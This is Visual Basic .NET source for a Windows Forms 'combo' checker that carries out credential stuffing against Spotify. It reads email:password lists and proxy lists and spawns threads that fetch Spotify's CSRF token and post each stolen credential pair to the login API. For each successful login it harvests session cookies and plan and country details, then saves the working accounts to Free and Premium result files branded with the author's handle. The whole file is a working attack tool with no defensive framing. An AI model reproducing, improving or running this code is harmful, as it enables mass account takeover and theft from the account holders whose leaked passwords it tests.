Imports System.Net
Imports System.IO
Imports System.Web
Imports System.Text
Imports System.Text.RegularExpressions
Imports xNet
Imports System.Threading
Imports System.Runtime.CompilerServices
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic

Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing

Imports System.Linq
Imports System.Resources

Imports System.Runtime.InteropServices

Imports System.Windows.Forms


Public Class Form1

    Inherits MetroFramework.Forms.MetroForm

    Public string_0 As String()

    Public int_0 As Integer

    Public bool_0 As Boolean

    Public int_1 As Integer

    Public int_2 As Integer

    Public string_1 As String

    Public string_2 As String

    Public string_3 As String

    Public string_4 As String

    Public int_3 As Integer

    Public int_4 As Integer

    Public int_5 As Integer

    Public string_5 As String()

    Public queue_0 As Queue

    Public string_6 As String()

    Public object_0 As Object

    Private label_0 As Label

    Public string_7 As String()

    Public proxyType_0 As ProxyType

    Public random_0 As Random

    Private button_0 As Button

    Public thread_0 As Thread()

    Public int_6 As Integer

    Public free As Integer

    Public int_7 As Integer

    Public int_8 As Integer

    Public int_11 As Integer

    Public int_12 As Integer

    Public int_13 As Integer

    Public int_14 As Integer

    Public int_15 As Integer

    Public int_16 As Integer

    Public int_17 As Integer

    Public good As Integer

    Public bad As Integer

    Public err As Integer

    Public remin As Integer

    ' Public free As Integer

    Public string_8 As String

    Public string_9 As String

    Public string_10 As String

    Public string_11 As String

    Private string_12 As String

    Private string_13 As String

    Public object_1 As Object

    Public string_14 As String



    Public Sub method_3()

        Dim proxyse As String = Me.string_7(Me.random_0.[Next](0, Me.int_4))
        Dim objectValue As Object = Nothing
        Dim str As String = Nothing
        Dim chrArray As Char()
        Dim string7 As String = Me.string_7(Me.random_0.[Next](0, Me.int_4))
        While Me.queue_0.Count <> 0
            Dim obj As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.object_0)))
            ObjectFlowControl.CheckForSyncLockOnValueType(RuntimeHelpers.GetObjectValue(obj))
            Dim objectValue1 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.object_1)))
            Dim flag As Boolean = False
            Try
                Dim obj1 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue1)))
                objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj1)))
                Monitor.Enter(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj1))), flag)
                Try
                    Dim str1 As String = Me.queue_0.Peek().ToString()
                    chrArray = New Char() {Strings.ChrW(13)}
                    str = str1.TrimEnd(chrArray).Trim()
                    Me.queue_0.Dequeue()
                Catch exception As System.Exception
                    ProjectData.SetProjectError(exception)
                    ProjectData.SetProjectError(exception)
                    ProjectData.ClearProjectError()
                    ProjectData.ClearProjectError()
                End Try
            Finally
                If (flag) Then
                    Monitor.[Exit](RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))))
                End If
            End Try
            Try


                Dim separator As String = ":"
                Dim split = str.Split(separator, 2, StringSplitOptions.RemoveEmptyEntries)
                Dim accemail As String = split(0)
                Dim accpassword As String = split(1)

                If accpassword = Nothing Then
                    err = err + 1
                    Me.queue_0.Enqueue(str)
                End If

                Dim s As New HttpRequest

                '   Thread.Sleep(5000)
                s.UserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"

                s.ConnectTimeout = 15000
                s.AllowAutoRedirect = True
                s.IgnoreProtocolErrors = True



                s.Proxy = ProxyClient.Parse(proxyType_0, proxyse)
                Dim cf As String = s.[Get]("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fint%2Faccount%2Foverview%2F", Nothing).GetRawCookie("csrf_token").Split(New Char() {";"c})(0)
                Dim cf2 As String = cf.Split(New Char() {"="c})(1)
                '  MsgBox(cf)
                '  MsgBox(cf2)
                '  s.Proxy = ProxyClient.Parse(ProxyType.Http, proxyse)

                s.ConnectTimeout = 15000
                s.AddHeader("Cookie", String.Concat(cf, ";__bon=MHwwfC0yMDM1NTQ0NDQ5fC04NTQ5Mjg2Njg1OHwxfDF8MXwx;"))

                s.AddParam("username", accemail)
                s.AddParam("password", accpassword)
                s.AddParam("remember", "true")

                s.AddParam("csrf_token", cf2)




                Dim rep As HttpResponse = s.[Post]("https://accounts.spotify.com/api/login")

                ' TextBox2.Text = rep.ToString
                Dim tex As New TextBox()
                tex.Text = rep.ToString
                ' Thread.Sleep(1000)
                Dim repp = rep.ToString

                If (tex.Text.Contains("displayName")) Then


                    Dim rcf As String = rep.GetRawCookie("csrf_token").Split(New Char() {";"c})(0)
                    Dim rspa As String = rep.GetRawCookie("sp_ac").Split(New Char() {";"c})(0)
                    Dim rspd As String = rep.GetRawCookie("sp_dc").Split(New Char() {";"c})(0)

                    s.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
                    s.AddHeader("Cookie", String.Concat(New String() {rcf, ";", rspa, ";;", rspd}))


                    Dim req2 As String = s.[Get]("https://www.spotify.com/us/api/account/overview/").ToString
                    Dim str5 = req2.Substring("""plan"":{""name"":""", """,""")
                    Dim str6 = req2.Substring("{""label"":""Country"",""value"":""", """}],")

                    ' TextBox2.Text = str5 & vbNewLine & str6


                    If str5 = "Spotify Free" Then
                        free = free + 1
                        good = good + 1
                        remin = remin - 1

                        If CheckBox1.CheckState = True Then

                            Dim newItem As New ListViewItem(str)

                            newItem.SubItems.Add(accemail)

                            newItem.SubItems.Add(accpassword)

                            newItem.SubItems.Add(str6)

                            newItem.SubItems.Add(str5)

                            newItem.SubItems.Add(proxyse)

                            ListView1.Items.Add(newItem)
                        End If

                        File.AppendAllText(String.Concat(Me.string_12, "\Free_Accounts.txt"), String.Concat("================={ By => !            Uchiha, Madara#8738 }=================" & vbNewLine & vbNewLine & "Combo : " & accemail & ":" & accpassword & vbNewLine & "Email : " & accemail & vbNewLine & "Password : " & accpassword & vbNewLine & "Country : " & str6 & vbNewLine & "Subscription : " & str5 & vbNewLine & "Proxy: " & proxyse & vbNewLine & vbNewLine & "=============================================================" & vbNewLine & vbNewLine))
                    Else

                        good = good + 1
                        remin = remin - 1

                        Dim newItem As New ListViewItem(str)

                        newItem.SubItems.Add(accemail)

                        newItem.SubItems.Add(accpassword)

                        newItem.SubItems.Add(str6)

                        newItem.SubItems.Add(str5)

                        newItem.SubItems.Add(proxyse)

                        ListView1.Items.Add(newItem)

                        File.AppendAllText(String.Concat(Me.string_12, "\Premium_Accounts.txt"), String.Concat("================={ By => !            Uchiha, Madara#8738 }=================" & vbNewLine & vbNewLine & "Combo : " & accemail & ":" & accpassword & vbNewLine & "Email : " & accemail & vbNewLine & "Password : " & accpassword & vbNewLine & "Country : " & str6 & vbNewLine & "Subscription : " & str5 & vbNewLine & "Proxy: " & proxyse & vbNewLine & vbNewLine & "=============================================================" & vbNewLine & vbNewLine))
                    End If

                Else
                    Me.queue_0.Enqueue(str)
                    remin = remin - 1
                    bad = bad + 1


                End If

                    Catch ex As Exception

                        If ex.Message.Contains("Index was outside the bounds of the array.") Then
                            Me.queue_0.Enqueue(str)
                        Else
                            err = err + 1
                            proxyse = Me.string_7(Me.random_0.[Next](0, Me.int_4))

                End If
            End Try


            If (Me.int_8 <= 0) Then
                Me.Timer1.[Stop]()
            End If

        End While

    End Sub




    Private Sub GroupBox1_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub




    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ' remin.Text = Me.int_12.ToString() - Label9.Text
        '  Label3.Text = Me.int_13.ToString()
        '  Label4.Text = Me.int_14.ToString()
        '  Label9.Text = Me.int_17.ToString()
        '   Label6.Text = Me.int_16.ToString()

        If remin <= 0 Then
            Process.Start(String.Concat(Application.StartupPath, "\Results"), Conversions.ToString(1))
            Timer1.Stop()
            End
        End If


        remin_txt.Text = "Remin: " & remin.ToString
        Label2.Text = "Good: " & good.ToString
        Label7.Text = "Free: " & free.ToString
        Label3.Text = "Bad: " & bad.ToString
        Label4.Text = "Errors: " & err.ToString

        If bad >= Me.int_3 Then
            Process.Start(String.Concat(Application.StartupPath, "\Results"), Conversions.ToString(1))
            Me.Timer1.Enabled = False
            End

        End If

    End Sub




    Public Sub New()
        MyBase.New()
        Dim form11 As Form1 = Me
        AddHandler MyBase.Load, New EventHandler(AddressOf form11.Form1_Load)
        ReDim Me.string_0(-1)
        Me.int_0 = 0
        ReDim Me.string_5(-1)
        Me.object_0 = RuntimeHelpers.GetObjectValue(New Object())
        Me.random_0 = New Random()
        Me.InitializeComponent()
        Control.CheckForIllegalCrossThreadCalls = False
        Me.object_1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(New Object())))
    End Sub



    <DllImport("urlmon.dll", CharSet:=CharSet.None, ExactSpelling:=False)>
    Private Shared Function CoInternetSetFeatureEnabled(ByVal int_8 As Integer, ByVal int_9 As Integer, ByVal bool_0 As Boolean) As Integer
    End Function

    <DllImport("Gdi32.dll", CharSet:=CharSet.None, ExactSpelling:=False)>
    Private Shared Function CreateRoundRectRgn(ByVal int_8 As Integer, ByVal int_9 As Integer, ByVal int_10 As Integer, ByVal int_11 As Integer, ByVal int_12 As Integer, ByVal int_13 As Integer) As IntPtr
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load




        Me.int_4 = 0
        Me.int_11 = 0
        Me.int_12 = 0
        Me.int_13 = 0
        Me.int_14 = 0
        Me.int_15 = 0
        Me.int_16 = 0
        Me.int_17 = 0
    End Sub

    Private Sub Button3_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
        'Process.Start(String.Concat(Application.StartupPath, "\Results"), Conversions.ToString(1))
        Me.Timer1.Enabled = False
        method_7()
        '   Threading.ab
        ' End



    End Sub
    Public Sub method_7()

        Me.thread_0(NumericUpDown1.Value).Abort()


    End Sub

    Private Sub NumericUpDown1_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub

    Private Sub ToolStripStatusLabel1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub



    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Process.Start("https://www.facebook.com/amir.dev.kiraalite")
        Process.Start("https://discord.gg/tcurPPw")
    End Sub

    Private Sub NumericUpDown1_ValueChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown1.ValueChanged

    End Sub








    Private Sub loadbtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles loadbtn.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog()
        Try
            openFileDialog.Filter = "Тext Files|*.txt"
            If (openFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
                Dim chrArray() As Char = {Strings.ChrW(10)}
                Me.string_6 = File.ReadAllText(openFileDialog.FileName).Trim().TrimEnd(New Char(-1) {}).Replace(";", ":").Split(chrArray).Distinct().ToArray()
                Me.int_3 = CInt(Me.string_6.Length)
                Me.int_8 = Me.int_3
                remin = Me.int_3
                remin_txt.Text = "Remain: " & remin.ToString
                '  Me.remin.Text = Me.int_3.ToString()
                Me.loadbtn.Text = String.Concat("Loaded Combo: ", Me.int_3.ToString())
                '   Label11.Text = Me.int_3.ToString()

            End If
        Finally
            If (openFileDialog IsNot Nothing) Then
                DirectCast(openFileDialog, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click

        If MetroComboBox1.SelectedIndex = 0 Then
            proxyType_0 = ProxyType.Http
        ElseIf MetroComboBox1.SelectedIndex = 1 Then
            proxyType_0 = ProxyType.Socks4
        ElseIf MetroComboBox1.SelectedIndex = 2 Then
            proxyType_0 = ProxyType.Socks5
        End If

        bad = 0
        err = 0
        good = 0
        remin_txt.Text = Me.int_3.ToString()
        Me.int_11 = 0
        Me.int_12 = 0
        Me.int_13 = 0
        Me.int_14 = 0
        Me.int_15 = 0
        Me.int_16 = 0
        Me.int_17 = 0


        Me.string_13 = DateTime.Now.ToString("dd-MM-yy HH-mm-ss")
        Me.string_12 = String.Concat("Results\Result ", Me.string_13)
        If (Me.int_3 = 0) Then
            Interaction.MsgBox("Please Load Combo !.", MsgBoxStyle.Exclamation, Nothing)
        ElseIf (Me.int_4 = 0) Then
            Interaction.MsgBox("Please Load Proxy !. ", MsgBoxStyle.Exclamation, Nothing)
        Else
            Me.int_2 = 0
            Me.int_1 = 0
            Me.string_5 = Nothing
            Me.string_0 = Nothing
            Me.int_6 = 0
            Me.int_7 = 0
            Me.int_8 = Me.int_3
            Me.Button2.Enabled = False
            NumericUpDown1.Enabled = False
            loadbtn.Enabled = False
            loadproxy.Enabled = False
            CheckBox1.Enabled = False
            '  CheckBox1.Enabled = False
            Me.Button3.Enabled = True
            Me.queue_0 = New Queue()
            Directory.CreateDirectory(Me.string_12)
            Dim int3 As Integer = Me.int_3 - 1
            Dim num As Integer = 0
            Do
                Me.queue_0.Enqueue(Me.string_6(num))
                num = num + 1
            Loop While num <= int3
            Me.int_5 = Convert.ToInt32(Me.NumericUpDown1.Value)
            ReDim Me.thread_0(Me.int_5 - 1 + 1 - 1)
            Dim int5 As Integer = Me.int_5 - 1
            Dim num1 As Integer = 0
            Do
                Dim form1 As Form1 = Me
                Me.thread_0(num1) = New Thread(New ThreadStart(AddressOf form1.method_3))
                Me.thread_0(num1).IsBackground = True
                Me.thread_0(num1).Start()
                num1 = num1 + 1
            Loop While num1 <= int5
            Me.Timer1.Enabled = True
            Me.bool_0 = True
            Me.ListView1.Items.Clear()
        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Me.Timer1.Enabled = False
        End
    End Sub

    Private Sub loadproxy_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles loadproxy.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog()
        Try
            openFileDialog.Filter = "Text Files|*.txt"
            If (openFileDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
                Me.string_7 = File.ReadAllLines(openFileDialog.FileName).Distinct().ToArray()
                Me.int_4 = CInt(Me.string_7.Length)
                Me.loadproxy.Text = String.Concat("Loaded Proxy: ", Me.int_4.ToString())
                '   Label13.Text = Me.int_4.ToString()
            End If
        Finally
            If (openFileDialog IsNot Nothing) Then
                DirectCast(openFileDialog, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub PictureBox1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        Process.Start("https://www.spotify.com/")
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        Process.Start("https://www.facebook.com/By.Amir.Dev")
    End Sub

    Private Sub Label5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label5.Click
        My.Computer.Clipboard.SetText("!            Uchiha, Madara#8738")
        MsgBox("Done ! You have copied The Name ")
    End Sub

    Private Sub MetroToolTip1_Popup(ByVal sender As System.Object, ByVal e As System.Windows.Forms.PopupEventArgs)

    End Sub
End Class
